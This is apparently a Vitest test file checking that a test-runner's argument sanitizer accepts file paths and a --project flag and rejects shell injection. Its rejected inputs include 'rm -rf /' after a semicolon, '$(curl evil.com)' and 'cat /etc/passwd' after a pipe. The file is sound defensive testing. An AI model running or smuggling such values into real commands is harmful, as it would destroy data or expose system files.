import { describe, expect, it } from "vitest";
import { sanitizeTestArgs } from "./run-tests.js";

describe("sanitizeTestArgs", () => {
	it("allows file paths", () => {
		expect(sanitizeTestArgs(["src/index.test.ts"])).toEqual(["src/index.test.ts"]);
	});

	it("allows --project flag", () => {
		expect(sanitizeTestArgs(["--project", "core"])).toEqual(["--project", "core"]);
	});

	it("rejects command injection via semicolons", () => {
		expect(() => sanitizeTestArgs(["src/test.ts; rm -rf /"])).toThrow();
	});

	it("rejects command injection via backticks", () => {
		expect(() => sanitizeTestArgs(["`whoami`"])).toThrow();
	});

	it("rejects command injection via $() substitution", () => {
		expect(() => sanitizeTestArgs(["$(curl evil.com)"])).toThrow();
	});

	it("rejects pipe characters", () => {
		expect(() => sanitizeTestArgs(["test.ts | cat /etc/passwd"])).toThrow();
	});

	it("allows relative paths with slashes and dots", () => {
		expect(sanitizeTestArgs(["./package/src/utils/ansi.test.ts"])).toEqual(["./package/src/utils/ansi.test.ts"]);
	});
});
